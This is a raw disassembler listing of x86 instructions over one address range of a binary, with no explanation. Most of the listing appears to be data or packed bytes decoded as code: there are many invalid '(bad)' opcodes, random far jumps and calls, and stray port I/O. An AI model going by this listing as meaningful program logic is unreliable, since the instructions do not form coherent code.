  4293c7:	shl    dl,0x9c
  4293ca:	hlt    
  4293cb:	mov    eax,0xbe033596
  4293d0:	test   eax,0x8ba0b9f
  4293d5:	adc    DWORD PTR [ecx+esi*2],eax
  4293d8:	js     0x4293ff
  4293da:	jb     0x4293ff
  4293dc:	fsub   QWORD PTR [esi+0x31]
  4293df:	mov    bl,0x57
  4293e1:	shl    DWORD PTR [edx+0x53bf0a89],1
  4293e7:	mov    edi,0xba33c141
  4293ec:	add    eax,0xc7cbaf9f
  4293f1:	mov    ds:0x31fbe8e3,al
  4293f6:	clc    
  4293f7:	ins    BYTE PTR es:[edi],dx
  4293f8:	adc    al,0x60
  4293fa:	jle    0x4293b2
  4293fc:	in     al,dx
  4293fd:	fdivr  QWORD PTR [ebx]
  4293ff:	enter  0xbdd4,0xa3
  429403:	mov    DWORD PTR [eax-0x67],ebp
  429406:	out    dx,al
  429407:	les    ebp,FWORD PTR [ecx+0x52]
  42940a:	(bad)  
  42940b:	cld    
  42940c:	(bad)  
  42940d:	cmp    esi,ebx
  42940f:	adc    DWORD PTR [ebx+0x6e61d556],eax
  429415:	inc    esi
  429416:	mov    ecx,0x1efc3e2f
  42941b:	(bad)  
  42941c:	cs loopne 0x429439
  42941f:	lds    ebp,FWORD PTR [ecx]
  429421:	push   0x4
  429423:	and    BYTE PTR [eax],ch
  429425:	retf   
  429426:	adc    ecx,DWORD PTR [esi+0x56]
  429429:	jae    0x42949e
  42942b:	ins    BYTE PTR es:[edi],dx
  42942c:	inc    esp
  42942d:	add    BYTE PTR [esi+0x60f1d9e2],0x1c
  429434:	dec    ecx
	...
  429495:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429499:	sub    al,0x53
  42949b:	ds jg  0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	stos   WORD PTR es:[edi],ax
  4294a4:	mov    dl,0xea
  4294a6:	sub    DWORD PTR [ecx+0x1070001],edi
  4294ac:	add    BYTE PTR [eax],al
  4294ae:	mov    ah,0xd5
  4294b0:	loope  0x4294d8
  4294b2:	adc    bl,cl
  4294b4:	(bad)  
  4294b5:	cmp    esi,DWORD PTR [ecx+0xc8b46f9]
  4294bb:	out    0x59,eax
  4294bd:	es dec ecx
  4294bf:	call   0xcc9b855a
  4294c4:	mov    eax,DWORD PTR ds:0xa845fc02
  4294ca:	jo     0x4294c0
  4294cc:	mov    edi,DWORD PTR [ebp-0x38]
  4294cf:	jecxz  0x429475
  4294d1:	mov    ebp,0x3d22e608
  4294d6:	push   0x52
  4294d8:	push   cs
  4294d9:	cmp    eax,0xe4142bbc
  4294de:	mov    eax,0x1f57e8cf
  4294e3:	mov    ch,0xbd
  4294e5:	std    
  4294e6:	xchg   edi,eax
  4294e7:	loop   0x4294a9
  4294e9:	mov    eax,0x28b5a933
  4294ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4294ef:	mov    eax,ds:0xef8b61fa
  4294f4:	mov    al,ds:0xdc8938d7
  4294f9:	popa   
  4294fa:	add    eax,0x1edc3328
  4294ff:	xchg   DWORD PTR [edx+0x3494c236],ebp
  429505:	inc    edx
  429506:	inc    eax
  429507:	adc    al,0x1e
  429509:	ss cmp al,0x1a
  42950c:	jae    0x4294a0
  42950e:	(bad)  
  42950f:	js     0x429509
  429511:	lods   eax,DWORD PTR ds:[esi]
  429512:	and    eax,DWORD PTR [edx-0x714d6562]
  429518:	xchg   esi,eax
  429519:	je     0x4294e5
  42951b:	retf   
  42951c:	cmp    al,0xc2
  42951e:	push   ebx
  42951f:	pop    edi
  429520:	dec    ecx
  429521:	outs   dx,BYTE PTR ds:[esi]
  429522:	fsubr  DWORD PTR [edx]
  429524:	sbb    DWORD PTR [eax+0x7f852e2e],esi
  42952a:	sahf   
  42952b:	setno  BYTE PTR ds:0x4c9def60
  429532:	xchg   eax,ebx
  429534:	jecxz  0x4294cc
  429536:	mov    cl,0x29
  429538:	dec    edx
  429539:	mov    ch,0xa
  42953b:	mov    ebx,0x6122013
  429540:	mov    WORD PTR [ebx+0x0],ds
  429543:	scas   eax,DWORD PTR es:[edi]
  429544:	into   
  429545:	mov    DWORD PTR [ebp+eax*8-0x1d],esi
  429549:	mov    cl,0xb
  42954b:	cs cwde 
  42954d:	cmc    
  42954e:	add    bh,ch
  429550:	mov    eax,ds:0xe1257460
  429555:	aam    0x5f
  429557:	jne    0x42952f
  429559:	xlat   BYTE PTR ds:[ebx]
  42955a:	mov    edi,0x235382d0
  42955f:	mov    cl,0x3f
  429561:	in     al,dx
  429562:	fsubr  QWORD PTR [edi-0x242a6c64]
  429568:	pop    ebp
  429569:	pop    esp
  42956a:	mov    bh,0x84
  42956c:	rcl    DWORD PTR [ebp-0x3dae6f0c],cl
  429572:	push   ebp
  429573:	push   edx
  429574:	(bad)  
  429575:	jecxz  0x429550
  429577:	push   es
  429578:	out    dx,eax
  429579:	pop    ds
  42957a:	(bad)  
  42957b:	jmp    0xedc8:0x65283af5
  429582:	xchg   ebp,eax
  429583:	cld    
  429584:	lock mov bh,0x5a
  429587:	dec    DWORD PTR [ebx-0x30]
  42958a:	adc    al,0x57
  42958c:	das    
  42958d:	mov    BYTE PTR ds:0x56bbf073,bl
  429593:	sub    ebx,esp
  429595:	xchg   ebp,eax
  429596:	cmc    
  429597:	xchg   ebx,eax
  429598:	lea    edx,[ecx+ebp*2-0x6c]
  42959c:	xor    al,0x2c
  42959e:	mov    bl,0x2
  4295a0:	pop    esi
  4295a1:	mov    ds,WORD PTR [edx+0x45]
  4295a4:	mov    esp,0xcce6ac62
  4295a9:	std    
  4295aa:	(bad)  
  4295ab:	repnz or DWORD PTR [edi-0x55fc22a1],ebx
  4295b2:	ja     0x4295c1
  4295b4:	leave  
	...
  429615:	add    BYTE PTR [ebp+0x1d],ch
  429618:	out    0xc0,al
  42961a:	idiv   bl
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	jmp    0x42966b
  429624:	xor    DWORD PTR [edi+0x30],ecx
  429627:	mov    edx,0x1070001
  42962c:	add    BYTE PTR [eax],al
  42962e:	pushf  
  42962f:	add    BYTE PTR [esi+ebp*4+0xba42a60],0xe6
  429637:	jecxz  0x42963f
  429639:	pop    edi
  42963a:	ret    
  42963b:	(bad)  
  42963c:	mov    ch,0x7e
  42963e:	dec    edx
  42963f:	xchg   edi,eax
  429640:	push   ecx
  429641:	inc    esi
  429642:	sbb    al,0x1c
  429644:	jp     0x42967d
  429646:	data16 add BYTE PTR [esp+esi*8-0x5a],dh
  42964b:	or     BYTE PTR [eax+0x2a12dbe2],dh
  429651:	and    bh,BYTE PTR [eax+0x13af8202]
  429657:	retf   0x13ca
  42965a:	dec    edx
  42965b:	in     al,dx
  42965c:	out    dx,eax
  42965d:	and    bl,BYTE PTR [esi+0x7a2aa645]
  429663:	xor    BYTE PTR [esi-0x25],dh
  429666:	mov    ebp,ebx
  429668:	cmp    DWORD PTR [edx+0x123fce6],edi
  42966e:	(bad)  
  42966f:	call   0x4818:0xaa0aaea7
  429676:	out    0x39,eax
  429678:	fcom   DWORD PTR [ecx-0x33]
  42967b:	xchg   DWORD PTR [edi],esi
  42967d:	(bad)  
  42967e:	aad    0xb5
  429680:	adc    al,0x76
  429682:	jle    0x429691
  429684:	push   es
  429685:	fsubr  QWORD PTR [edi-0x2b381131]
  42968b:	cmp    cl,BYTE PTR [eax]
  42968d:	push   cs
  42968e:	(bad)  
  42968f:	push   0x93ac3f06
  429694:	jo     0x429637
  429696:	out    dx,al
  429697:	jg     0x429718
  429699:	or     al,0xc7
  42969b:	push   esp
  42969c:	fmul   QWORD PTR ds:0xe2394b77
  4296a2:	or     BYTE PTR [ebx],0x65
  4296a5:	ret    
  4296a6:	out    dx,al
  4296a7:	fwait
  4296a8:	dec    ecx
  4296a9:	xchg   ebx,eax
  4296aa:	dec    esp
  4296ab:	sbb    DWORD PTR [ecx+0x4865a7cd],esp
  4296b1:	jae    0x4296c3
  4296b3:	out    0x58,al
  4296b5:	imul   edi,DWORD PTR [eax+ecx*1+0x2f],0xfacf3d34
  4296bd:	cmp    eax,0x5f6b7234
  4296c2:	in     eax,0xdd
  4296c4:	outs   dx,DWORD PTR ds:[esi]
  4296c5:	or     dl,BYTE PTR [ecx+ebp*4]
  4296c8:	mov    ds,WORD PTR [ecx+0x41]
  4296cb:	test   bl,dh
  4296cd:	call   0x848a:0x68e8a7f8
  4296d4:	clc    
  4296d5:	mov    ch,0x31
  4296d7:	gs in  al,dx
  4296d9:	loopne 0x4296f3
  4296db:	stos   DWORD PTR es:[edi],eax
  4296dc:	ss in  al,dx
  4296de:	ja     0x429703
  4296e0:	inc    ecx
  4296e1:	xor    BYTE PTR [ecx],0x60
  4296e4:	sbb    BYTE PTR fs:[edx+0x20],dh
  4296e8:	jmp    0x42971e
  4296ea:	stos   DWORD PTR es:[edi],eax
  4296eb:	ror    DWORD PTR [edx+ebp*2],1
  4296ee:	jmp    0x8a63:0x37f71ab
  4296f5:	aad    0xb3
  4296f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4296f8:	jns    0x42976e
  4296fa:	neg    BYTE PTR [esi+0x7f169e6c]
  429700:	aas    
  429701:	cmp    al,0x2e
  429703:	outs   dx,DWORD PTR ds:[esi]
  429704:	mov    al,ds:0x27d54e3b
  429709:	sar    DWORD PTR [esi+0x78de8623],0x1e
  429710:	stos   DWORD PTR es:[edi],eax
  429711:	push   ds
  429712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429713:	pop    edx
  429714:	dec    edi
  429715:	ret    0xcf0a
  429718:	into   
  429719:	enter  0x9c90,0xe5
  42971d:	or     DWORD PTR [edi-0x52],ebp
  429720:	jmp    0x429710
  429722:	and    ebx,DWORD PTR [esi-0x37]
  429725:	(bad)  
  429726:	adc    al,0x7f
  429728:	add    al,BYTE PTR [eax-0x6a]
  42972b:	repz (bad) 
  42972d:	fisttp QWORD PTR [ebp-0x2a812c38]
  429733:	jo     0x429755
	...
  429795:	add    BYTE PTR [eax],dh
  429797:	inc    edx
  429798:	fbld   TBYTE PTR [edx-0x1]
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	jge    0x376a0824
  4297a7:	mov    ebx,0x1070001
  4297ac:	add    BYTE PTR [eax],al
  4297ae:	mov    cs:0x8655367a,eax
  4297b4:	push   ecx
  4297b5:	imul   ebp,eax,0x1b
  4297b8:	cwde   
  4297b9:	lods   al,BYTE PTR ds:[esi]
  4297ba:	jno    0x42978c
  4297bc:	daa    
  4297bd:	sbb    esp,edx
  4297bf:	inc    ecx
  4297c0:	or     BYTE PTR [ebx+0x1b],bh
  4297c3:	(bad)  
  4297c4:	xchg   edx,eax
  4297c5:	jne    0x42976a
  4297c7:	(bad)  
  4297c8:	mov    ecx,0x39b91dbb
  4297cd:	fnstenv [ecx]
  4297cf:	fsubrp st(5),st
  4297d1:	sub    DWORD PTR [ebx+0x38],eax
  4297d4:	pop    ebp
  4297d5:	xchg   ebp,eax
  4297d6:	fstp   DWORD PTR [ecx+0x46]
  4297d9:	outs   dx,BYTE PTR ds:[esi]
  4297da:	sbb    cl,BYTE PTR [ecx+0x2]
  4297dd:	fmul   st(1),st
  4297df:	jge    0x4297a0
  4297e1:	xor    DWORD PTR [edx+0x4e6d7918],0x27
  4297e8:	xor    al,0x65
  4297ea:	shl    BYTE PTR [edi],1
  4297ec:	cmc    
  4297ed:	push   0xffffffd6
  4297ef:	loope  0x4297d2
  4297f1:	push   ecx
  4297f2:	sar    BYTE PTR [ebp-0x72],1
  4297f5:	dec    ebp
  4297f6:	outs   dx,DWORD PTR ds:[esi]
  4297f7:	fs jl  0x4297e6
  4297fa:	into   
  4297fb:	push   esi
  4297fc:	pusha  
  4297fd:	ds pop eax
  4297ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429800:	jne    0x429856
  429802:	(bad)  
  429803:	pop    ss
  429804:	or     cl,ch
  429806:	inc    edi
  429807:	pop    esi
  429808:	xchg   ebp,eax
  429809:	aaa    
  42980a:	iret   
  42980b:	push   ebp
  42980c:	dec    esi
  42980d:	add    al,0x97
  42980f:	xchg   edi,eax
  429810:	pop    ecx
  429811:	and    dl,BYTE PTR [edx-0x142c501b]
  429817:	mov    eax,0xae493899
  42981c:	enter  0x9b4b,0xe5
  429820:	sub    BYTE PTR [ebx],ch
  429822:	repnz out dx,eax
  429824:	shl    DWORD PTR [eax],cl
  429826:	mov    al,ds:0x3e27fa54
  42982b:	fisttp QWORD PTR [esi-0x71c9cc64]
  429831:	xor    BYTE PTR [edi*2+0x1b4217d6],al
  429838:	or     BYTE PTR [edx],cl
  42983a:	retf   0x9d69
  42983d:	pop    es
  42983e:	mov    eax,0xc748515c
  429843:	ret    
  429844:	or     DWORD PTR [esi-0x4e820d02],esp
  42984a:	mov    DWORD PTR [eax],ebx
  42984c:	ret    0x7630
  42984f:	xchg   DWORD PTR [ebx+eax*8+0xf],esp
  429853:	leave  
  429854:	and    DWORD PTR [ebp-0x60],0x9d4cd119
  42985b:	xchg   ecx,eax
  42985c:	mov    cs,edx
  42985e:	(bad)  
  429860:	gs add edx,esi
  429863:	and    BYTE PTR [edi+0x163ef80],ah
  429869:	or     BYTE PTR [edx-0x3a],dl
  42986c:	push   ecx
  42986d:	cwde   
  42986e:	dec    eax
  42986f:	xor    bh,dl
  429871:	lock rcr DWORD PTR [edi+eiz*8-0x5c],1
  429876:	cdq    
  429877:	mov    ds:0xc8aa78ca,al
  42987c:	lock jecxz 0x429870
  42987f:	imul   esp,DWORD PTR [eax-0x7b],0x35465937
  429886:	mov    ecx,0xd1fb92d9
  42988b:	xchg   esp,eax
  42988c:	xchg   esp,eax
  42988d:	nop
  42988e:	dec    eax
  42988f:	jno    0x4298b1
  429891:	ja     0x429831
  429893:	test   BYTE PTR [ebx],bh
  429895:	imul   eax,edx,0x727294b4
  42989b:	or     al,0xe3
  42989d:	xor    DWORD PTR [ecx-0x2ee6280b],ebp
  4298a3:	and    esp,esi
  4298a5:	sub    al,0x6e
  4298a7:	jmp    0x2c77:0xea36b577
  4298ae:	loop   0x429914
  4298b0:	mov    ebp,0x7df8ffc6
	...
  429915:	add    BYTE PTR [edi+0x68],dl
  429918:	fistp  QWORD PTR fs:[edi-0x21]
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	shr    BYTE PTR [ebp-0x43c10909],1
  429928:	add    DWORD PTR [eax],eax
  42992a:	pop    es
  42992b:	add    DWORD PTR [eax],eax
  42992d:	add    dl,al
  42992f:	pushf  
  429930:	fwait
  429931:	jns    0x4298e7
  429933:	add    BYTE PTR [edx],ch
  429935:	iret   
  429936:	pop    ss
  429937:	add    eax,0x8f4ea3e5
  42993c:	stc    
  42993d:	sub    al,0xc6
  42993f:	or     al,0x27
  429941:	mov    eax,0x65b5864e
  429946:	in     al,0x9b
  429948:	pop    ss
  429949:	jl     0x4299a4
  42994b:	pop    esi
  42994c:	jae    0x429961
  42994e:	mov    edi,esp
  429950:	and    al,0xee
  429952:	xor    eax,0xc1598998
  429957:	sbb    edi,edi
  429959:	cmp    esi,DWORD PTR [ebx]
  42995b:	(bad)  
  42995e:	into   
  42995f:	gs movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  429962:	and    al,bl
  429964:	pop    edi
  429965:	inc    edi
  429966:	das    
  429967:	xor    DWORD PTR [edi*8-0x344865a5],esp
  42996e:	adc    esp,DWORD PTR [ebx-0x410e1806]
  429974:	xor    BYTE PTR [edi+0x29a2be23],dl
  42997a:	dec    ebx
  42997b:	gs inc eax
  42997d:	jbe    0x4299f1
  42997f:	and    BYTE PTR [ebx+0x7f678c7d],al
  429985:	sbb    eax,DWORD PTR [ebx]
  429987:	adc    eax,0xb4619580
  42998c:	ins    DWORD PTR es:[edi],dx
  42998d:	imul   edi,ebx,0x80accdc5
  429993:	pushf  
  429994:	mov    esi,DWORD PTR [ecx+eax*1]
  429997:	mov    dh,0xde
  429999:	loop   0x42997d
  42999b:	inc    ebp
  42999c:	stos   DWORD PTR es:[edi],eax
  42999d:	push   ds
  42999e:	sbb    al,0x95
  4299a0:	sub    al,0x2c
  4299a2:	cwde   
  4299a3:	inc    ecx
  4299a4:	and    edi,DWORD PTR [esi]
  4299a6:	shl    BYTE PTR [esi],0x2d
  4299a9:	add    DWORD PTR [ecx+0x43],edi
  4299ac:	fild   QWORD PTR [ecx*4+0x4d1e975c]
  4299b3:	lock or dl,al
  4299b6:	lods   al,BYTE PTR ds:[esi]
  4299b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4299b8:	mov    esi,0x6dfcb997
  4299bd:	addr16 xchg edx,eax
  4299bf:	lock xchg edx,eax
  4299c1:	rcr    BYTE PTR [ebx],1
  4299c3:	lods   eax,DWORD PTR ds:[esi]
  4299c4:	pop    ebx
  4299c5:	inc    ebp
  4299c6:	shr    BYTE PTR [ebx],0x75
  4299c9:	(bad)  
  4299ca:	mov    al,0x4
  4299cc:	out    dx,al
  4299cd:	ins    DWORD PTR es:[edi],dx
  4299ce:	pop    esp
  4299cf:	scas   al,BYTE PTR es:[edi]
  4299d0:	xchg   esi,eax
  4299d1:	jl     0x429a4c
  4299d3:	pop    ebp
  4299d4:	hlt    
  4299d5:	inc    edx
  4299d6:	fwait
  4299d7:	cmp    al,0x7c
  4299d9:	or     esi,DWORD PTR [edx]
  4299db:	lgs    eax,FWORD PTR [esi]
  4299de:	adc    edx,DWORD PTR [eax+0x71]
  4299e1:	adc    ah,BYTE PTR [ecx+0x4c]
  4299e4:	cwde   
  4299e5:	sub    BYTE PTR [ecx+0x2fdbe9f5],0xf3
  4299ec:	ss push ds
  4299ee:	xchg   ebp,eax
  4299ef:	adc    bh,bh
  4299f1:	rcl    BYTE PTR [ebx-0x70],1
  4299f4:	inc    edi
  4299f5:	aam    0xae
  4299f7:	ins    DWORD PTR es:[edi],dx
  4299f8:	mov    ecx,0xcb3f6cc2
  4299fd:	xor    dh,al
  4299ff:	jno    0x42998f
  429a01:	or     DWORD PTR [ebp-0x46],ebp
  429a04:	mov    esp,0x65840965
  429a09:	sub    ebx,DWORD PTR [eax+0x18b9f615]
  429a0f:	aad    0xf6
  429a11:	mov    eax,ds:0xd8d2514e
  429a16:	int3   
  429a17:	pusha  
  429a18:	ins    BYTE PTR es:[edi],dx
  429a19:	adc    dl,BYTE PTR [ecx+edx*8-0x39092437]
  429a20:	gs std 
  429a22:	scas   eax,DWORD PTR es:[edi]
  429a23:	dec    edx
  429a24:	fadd   QWORD PTR [ecx+ecx*8+0x27]
  429a28:	xor    BYTE PTR [ebx-0xa],al
  429a2b:	je     0x429a49
  429a2d:	mov    bl,0x29
  429a2f:	dec    ecx
  429a30:	into   
  429a31:	dec    ebp
  429a32:	lods   al,BYTE PTR ds:[esi]
  429a33:	inc    eax
  429a34:	call   0x0:0x0
	...
  429a93:	add    BYTE PTR [eax],al
  429a95:	add    dh,cl
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0xd880f13
  429aa5:	mov    edx,0x1bd45
  429aaa:	pop    es
  429aab:	add    DWORD PTR [eax],eax
  429aad:	add    dl,ah
  429aaf:	mov    dh,0xdc
  429ab1:	fisub  DWORD PTR [edx-0x61]
  429ab4:	popa   
  429ab5:	push   eax
  429ab6:	sbb    esp,DWORD PTR [eax]
  429ab8:	fdivr  st(2),st
  429aba:	jo     0x429b1b
  429abc:	sub    eax,0xe8e39eb
  429ac1:	retf   
  429ac2:	jp     0x429aef
  429ac4:	cmp    ebx,DWORD PTR [esi-0x6906158d]
  429aca:	adc    al,0xc3
  429acc:	xchg   ebx,eax
  429acd:	add    al,0xfb
  429acf:	arpl   WORD PTR [ebx-0x6566970],sp
  429ad5:	mov    esp,DWORD PTR [ecx-0x7c]
  429ad8:	retf   0x7e0d
  429adb:	mov    al,0xd5
  429add:	clc    
  429ade:	xchg   ebp,eax
  429adf:	lods   eax,DWORD PTR ds:[esi]
  429ae0:	mov    WORD PTR [ebx+0x27],?
  429ae3:	cs call 0xd678:0x4a81b6d8
  429aeb:	icebp  
  429aec:	xor    al,0x49
  429aee:	out    0x37,eax
  429af0:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429af2:	sub    BYTE PTR [edi-0x42],0x85
  429af6:	jno    0x429b60
  429af8:	inc    edi
  429af9:	xchg   ebp,eax
  429afa:	mov    cl,0x60
  429afc:	xor    eax,0xbf753054
  429b01:	xchg   ecx,eax
  429b02:	adc    DWORD PTR [ebp-0x47],0xffffff8c
  429b06:	xor    al,BYTE PTR [ecx]
  429b08:	mov    ds:0x278556a3,al
  429b0d:	inc    edi
  429b0e:	dec    ebp
  429b0f:	dec    edx
  429b10:	dec    edx
  429b11:	into   
  429b12:	jl     0x429b3c
  429b14:	rcr    DWORD PTR [ebx-0x73],cl
  429b17:	pop    ebp
  429b18:	fldenv [edi+ebp*2]
  429b1b:	sahf   
  429b1c:	fwait
  429b1d:	imul   esp,eax,0xffffffbc
  429b20:	pushf  
  429b21:	mov    ch,0x3d
  429b23:	in     al,dx
  429b24:	sbb    edi,ebp
  429b26:	jle    0x429b7f
  429b28:	or     DWORD PTR [edi],0x57
  429b2b:	sbb    DWORD PTR [edx-0x4995fa11],0x1
  429b32:	out    dx,al
  429b33:	leave  
  429b34:	mov    ch,0x7a
  429b36:	push   0xb57abd00
  429b3b:	add    DWORD PTR [ebx+0x32fb85c9],0x64
  429b42:	push   eax
  429b43:	dec    ebp
  429b44:	xchg   ecx,eax
  429b45:	xor    DWORD PTR [ebx-0x6e269ae9],esi
  429b4b:	and    bh,ah
  429b4d:	ds ret 0x6d55
  429b51:	jle    0x429ae4
  429b53:	mov    esi,0x4ceec563
  429b58:	add    eax,0x42090671
  429b5d:	lock xor eax,0x955a6814
  429b63:	fcomp  DWORD PTR [eax]
  429b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b66:	aad    0xed
  429b68:	fstp   QWORD PTR [eax+0x5a]
  429b6b:	sbb    esp,esp
  429b6d:	retf   
  429b6e:	out    dx,eax
  429b6f:	lea    edx,ds:0x812ce425
  429b75:	jg     0x429afd
  429b77:	scas   eax,DWORD PTR es:[edi]
  429b78:	jl     0x429b30
  429b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b7b:	les    esp,FWORD PTR [ecx]
  429b7d:	das    
  429b7e:	(bad)  
  429b7f:	jg     0x429b78
  429b81:	out    dx,eax
  429b82:	ss push edx
  429b84:	sbb    DWORD PTR [esp+ebx*8+0x1167cc3f],0x66bd1330
  429b8f:	jge    0x429bbf
  429b91:	int    0x2b
  429b93:	cmp    edx,DWORD PTR [ebx-0x53]
  429b96:	xor    esi,DWORD PTR [edx-0x4]
  429b99:	repnz push 0x4e514dee
  429b9f:	lods   eax,DWORD PTR ds:[esi]
  429ba0:	nop
  429ba1:	in     eax,0x67
  429ba3:	jle    0x429b59
  429ba5:	xor    bh,bh
  429ba7:	lahf   
  429ba8:	hlt    
  429ba9:	frstor [edi+0x7f]
  429bac:	push   edi
  429bad:	(bad)  
  429bae:	dec    edx
  429baf:	xor    eax,0xf3c81bb3
  429bb4:	retf   
	...
  429c15:	add    BYTE PTR [ebx-0x487759ea],ah
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	mov    ds:0x4c4ce1f5,eax
  429c27:	mov    esi,0x1070001
  429c2c:	add    BYTE PTR [eax],al
  429c2e:	rol    DWORD PTR [eax],cl
  429c30:	or     eax,0xaa30d718
  429c35:	shr    edi,0x54
  429c38:	scas   al,BYTE PTR es:[edi]
  429c39:	dec    ebx
  429c3a:	inc    eax
  429c3b:	lea    ebx,[edx]
  429c3d:	or     al,0x1
  429c3f:	sub    al,0x7d
  429c42:	dec    esi
  429c43:	push   edi
  429c44:	not    ebx
  429c46:	in     eax,dx
  429c47:	adc    BYTE PTR [ebx+0x44bada3d],cl
  429c4d:	mov    ah,0x20
  429c4f:	add    DWORD PTR [ecx+ebx*8-0x6e41b1dc],edi
  429c56:	adc    eax,0xffffff85
  429c59:	sub    DWORD PTR [ebp+eax*2-0x64b4c661],ecx
  429c60:	sbb    al,BYTE PTR ds:0xaf76c121
  429c66:	aaa    
  429c67:	ficomp WORD PTR [eax]
  429c69:	add    ah,BYTE PTR [ebp-0x28]
  429c6c:	jl     0x429c73
  429c6e:	int    0x6f
  429c70:	inc    ecx
  429c71:	or     edi,DWORD PTR [edi-0x10a55328]
  429c77:	js     0x429c50
  429c79:	je     0x429c1f
  429c7b:	dec    edi
  429c7c:	inc    eax
  429c7d:	adc    ebp,DWORD PTR [ebp+0x6f2acfc6]
  429c83:	jmp    DWORD PTR [edx]
  429c85:	gs mov eax,0xab857302
  429c8b:	imul   DWORD PTR [edi+0x7c]
  429c8e:	add    eax,0xef4bd3f2
  429c93:	iret   
  429c94:	rcl    bl,0x20
  429c97:	mov    ah,0x47
  429c99:	aaa    
  429c9a:	jecxz  0x429c1e
  429c9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c9d:	call   0x2838:0xc06b0132
  429ca4:	nop
  429ca5:	xchg   esp,eax
  429ca6:	bound  ecx,QWORD PTR [edx]
  429ca8:	mov    esp,0xd18f5fff
  429cad:	inc    edi
  429cae:	and    BYTE PTR [edx+0x6e7f6888],ch
  429cb4:	ficom  DWORD PTR [ebx+0x30]
  429cb7:	(bad)  
  429cb8:	(bad)  
  429cb9:	sub    BYTE PTR [edx+0x925ccf3],dh
  429cbf:	dec    ebx
  429cc0:	mov    dl,0x32
  429cc2:	and    cl,bl
  429cc4:	adc    ebp,DWORD PTR [ecx-0x3f]
  429cc7:	dec    ecx
  429cc8:	add    eax,0xa3857c2c
  429ccd:	ins    DWORD PTR es:[edi],dx
  429cce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ccf:	xchg   ecx,eax
  429cd0:	xchg   edi,eax
  429cd1:	push   edi
  429cd2:	je     0x429d04
  429cd4:	push   ds
  429cd5:	xchg   esp,eax
  429cd6:	mov    bh,0xc7
  429cd8:	jbe    0x429c9e
  429cda:	pop    edi
  429cdb:	daa    
  429cdc:	mov    eax,esi
  429cde:	shr    BYTE PTR [ebp-0x644ae448],cl
  429ce4:	mov    edx,0x7f813daa
  429ce9:	jbe    0x429ca4
  429ceb:	dec    ecx
  429cec:	mov    bh,0xa
  429cee:	xchg   ebp,eax
  429cef:	mov    edx,DWORD PTR [edi]
  429cf1:	std    
  429cf2:	mov    BYTE PTR [eax+0x65992ba5],al
  429cf8:	aaa    
  429cf9:	and    BYTE PTR [eax],ah
  429cfb:	outs   dx,BYTE PTR ds:[esi]
  429cfc:	xor    eax,DWORD PTR [eax-0x22]
  429cff:	scas   eax,DWORD PTR es:[edi]
  429d00:	cmc    
  429d01:	scas   eax,DWORD PTR es:[edi]
  429d02:	cmp    al,0x80
  429d04:	dec    edx
  429d05:	call   0x8379:0xd36bb251
  429d0c:	call   0xe767:0xd6f11a84
  429d13:	push   es
  429d14:	das    
  429d15:	pusha  
  429d16:	inc    eax
  429d17:	div    BYTE PTR [ebp+0x75]
  429d1a:	fist   WORD PTR [esi+eiz*8-0x40dfda44]
  429d21:	call   0xf1a4:0x6370d1c9
  429d28:	mov    ecx,0x3392b804
  429d2d:	push   esp
  429d2e:	dec    edx
  429d2f:	arpl   WORD PTR [ebx],sp
  429d31:	pop    ebx
  429d32:	sbb    DWORD PTR ds:0x29,0x0
	...
  429d94:	add    BYTE PTR [eax],al
  429d96:	fwait
  429d97:	mov    bh,0xc4
  429d99:	or     al,0xec
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0xa331e689
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	xchg   ebx,eax
  429daf:	pop    edi
  429db0:	loop   0x429e0b
  429db2:	and    DWORD PTR [eax],eax
  429db4:	std    
  429db5:	mov    ebx,0xdfcab2cc
  429dba:	jmp    0x2d2d:0xccd563b6
  429dc1:	mov    ds:0xa7d1a455,al
  429dc6:	in     al,0x47
  429dc8:	xchg   ecx,eax
  429dc9:	add    DWORD PTR [ebp-0x22],esi
  429dcc:	(bad)  
  429dcd:	and    DWORD PTR [ebx+0x20],ecx
  429dd0:	fild   DWORD PTR [esi]
  429dd2:	je     0x429d96
  429dd4:	push   es
  429dd5:	std    
  429dd6:	das    
  429dd7:	sub    bh,BYTE PTR [ebp-0x7c]
  429dda:	js     0x429ded
  429ddc:	out    dx,eax
  429ddd:	and    DWORD PTR [eax],ebx
  429ddf:	retf   
  429de0:	add    cl,cl
  429de2:	mov    ebx,0xe910a0d1
  429de7:	enter  0x38d6,0xa0
  429deb:	mov    ?,WORD PTR [eax+0x7d]
  429dee:	dec    ecx
  429def:	jae    0x429e3f
  429df1:	mov    bh,0xf
  429df3:	sbb    BYTE PTR [edi],al
  429df5:	inc    ecx
  429df6:	dec    ebx
  429df7:	(bad)  
  429df9:	pop    eax
  429dfa:	mov    ebp,0xebdb4760
  429dff:	jo     0x429d95
  429e01:	mov    ecx,0xf423e4b1
  429e06:	arpl   WORD PTR [edx+0x7a],sp
  429e09:	or     eax,0x9794cbc4
  429e0e:	push   ecx
  429e0f:	add    ah,BYTE PTR [esi-0x2b]
  429e12:	adc    ebx,0x51
  429e15:	jbe    0x429e7b
